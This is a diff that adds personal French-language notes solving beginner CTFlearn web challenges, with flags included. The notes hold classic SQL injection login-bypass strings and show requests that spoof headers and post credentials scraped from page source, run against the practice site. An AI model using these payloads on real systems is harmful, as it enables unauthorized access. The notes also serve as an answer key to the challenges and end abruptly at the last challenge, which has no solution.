@@ -1,0 +1,135 @@
+https://ctflearn.com/index.php?action=show_all_problems
+========================================================
+
+premier challenge "Basic injection" :
+soution ici :
+https://www.asafety.fr/mysql-injection-cheat-sheet/
+et donc :
+' OR 1 -- -
+' OR '' = '
+' OR 1 = 1 -- -
+'='
+'LIKE'
+'=0--+
+
+=======================================================
+
+le deuxieme challenge "Don't Bump Your Head(er)":
+il faut analyser un tout petit peu :
+on doit ouvrir la page en changeant son user agent, pour cela il faut trouver un indice
+cet indice c'est en regardant le code source de la page : le mot "Sup3rS3cr3tAg3nt" apparait, allez on tente le coup, mais la il nous dit que l'on doit venir du site "awesomesauce.com" docn il faut changer le User agent + le Referer.
+
+L'outil qui va bien :
+https://github.com/jakubroztocil/httpie#http-headers
+on peut l'installer en apt install httpie (trop top)
+
+il faut capturer son cookie avant... et le mettre dans la ligne de commande suivante ....
+la requete qui va bien :
+DebSec:~/Git# http https://ctflearn.com/header.php User-Agent:Sup3rS3cr3tAg3nt Cookie:valued=d7255b4cf7e1a2750950353097fa3c4681491841854 Referer:awesomesauce.com
+HTTP/1.1 200 OK
+CF-RAY: 34d80449780e6938-CDG
+Connection: keep-alive
+Content-Encoding: gzip
+Content-Type: text/html
+Date: Mon, 10 Apr 2017 19:12:17 GMT
+Server: cloudflare-nginx
+Set-Cookie: __cfduid=d55e9140626aa29bc154b623c8882040d1491851536; expires=Tue, 10-Apr-18 19:12:16 GMT; path=/; domain=.ctflearn.com; HttpOnly
+Transfer-Encoding: chunked
+X-Powered-By: PHP/5.5.9-1ubuntu4.17
+
+Here is your flag: flag{did_this_m3ss_with_y0ur_h34d}
+<!-- Sup3rS3cr3tAg3nt  -->
+
+DebSec:~/Git# http https://ctflearn.com/header.php User-Agent:Sup3rS3cr3tAg3nt Cookie:valued=d7255b4cf7e1a2750950353097fa3c4681491841854 Referer:awesomesauce.com
+
+=========================================================
+Troisieme challenge :
+trame :
+In the computing industry, standards are established to facilitate information interchanges among American coders. Unfortunately, I've made communication a little bit more difficult. Can you figure this one out? 41 42 43 54 46 7B 34 35 43 31 31 5F 31 35 5F 55 35 33 46 55 4C 7D
+
+hex to text :
+http://www.convertstring.com/EncodeDecode/HexDecode
+ABCTF{45C11_15_U53FUL}
+
+oot@DebSec:~/Git# echo "41 42 43 54 46 7B 34 35 43 31 31 5F 31 35 5F 55 35 33 46 55 4C 7D"|xxd -r -p
+ABCTF{45C11_15_U53FUL}root@DebSec:~/Git# 
+root@DebSec:~/Git# 
+
+========================================================
+
+Reversal of fortune
+BY CRYPTO
+
+Our team of agents have been tracking a hacker that sends cryptic messages to other hackers about what he's doing. We intercepted the below message he sent recently, can you figure out what it says? He mentions his hacker name in it, that's the code you need. .nac uoy fi tIe$reveRpilF eldnah ym gnisu em egassem ,avaj yllacificeps ,gnidoc emos htiw pleh deen I ,deifitnedi tegrat txeN 
+
+
+Simplement le texte doit être reversé :
+http://textmechanic.com/text-tools/obfuscation-tools/reverse-text-generator/
+Next target identified, I need help with some coding, specifically java, message me using my handle FlipRever$eIt if you can.
+le flag est le nom du hacker : FlipRever$eIt
+
+En CLI attention doit mettre un carractère d'échappement pour le "$" sinon ça ne marche pas :
+root@DebSec:~/Git# echo ".nac uoy fi tIe$reveRpilF eldnah ym gnisu em egassem ,avaj yllacificeps ,gnidoc emos htiw pleh deen I ,deifitnedi tegrat txeN" |rev
+Next target identified, I need help with some coding, specifically java, message me using my handle eIt if you can.
+root@DebSec:~/Git# echo ".nac uoy fi tIei\$reveRpilF eldnah ym gnisu em egassem ,avaj yllacificeps ,gnidoc emos htiw pleh deen I ,deifitnedi tegrat txeN" |rev
+Next target identified, I need help with some coding, specifically java, message me using my handle FlipRever$ieIt if you can.
+root@DebSec:~/Git# 
+
+
+
+========================================================
+
+Taking LS
+BY ALEXKATO29
+
+Just take the Ls https://mega.nz/#!9Mk00LxR!_FtmAm8s_mpsHr7KWv8GYUzhbThNn0I8cHMBi4fJQp8 
+
+Apres avoir charger le .zip :
+root@DebSec:~/Documents/Challenge/ctflearn.com# unzip The\ Flag.zip 
+Archive:  The Flag.zip
+   creating: The Flag/
+  inflating: The Flag/.DS_Store      
+   creating: __MACOSX/
+   creating: __MACOSX/The Flag/
+  inflating: __MACOSX/The Flag/._.DS_Store  
+   creating: The Flag/.ThePassword/
+  inflating: The Flag/.ThePassword/ThePassword.txt  
+  inflating: The Flag/The Flag.pdf   
+  inflating: __MACOSX/The Flag/._The Flag.pdf  
+root@DebSec:~/Documents/Challenge/ctflearn.com# 
+
+On voit un .pdf et surtout un ThePassword.txt, donc logiquement le password permet d'ouvrir le pdf qui contient le flag.
+
+le flag :
+ABCTF{T3Rm1n4l_is_C00l}
+
+=======================================================
+
+POST Practice
+BY INTELAGENT
+
+These website requires authentication, via POST. However, it seems as if someone has defaced our site. Maybe these is still some way to authenticate? https://ctflearn.com/post.php 
+
+Ouverture de la page source :
+<h1>This site takes POST data that you have not submitted!</h1><!-- username: admin | password: 71urlkufpsdnlkadsf -->
+
+On a donc le login password, mais il faut le passer avec une requete POST.
+ON va regarder du cote de l'outil httpie....
+
+PAs réussit avec httpie mais avec CURL :
+https://davidwalsh.name/curl-post-file
+root@DebSec:~/Documents/Challenge/ctflearn.com# curl -X POST -F 'username=admin' -F 'password=71urlkufpsdnlkadsf' https://ctflearn.com/post.php
+<h1>flag{p0st_d4t4_4ll_d4y}</h1>
+
+=======================================================
+
+Git Is Good
+BY INTELAGENT
+
+The flag used to be there. But then I redacted it. Good Luck. https://mega.nz/#!C483DAYB!Jjr55hfJQJ5-jspnyrnVtqBkMHGJrd6Nn_QqM7iXEuc
+
+
+
+
+
+
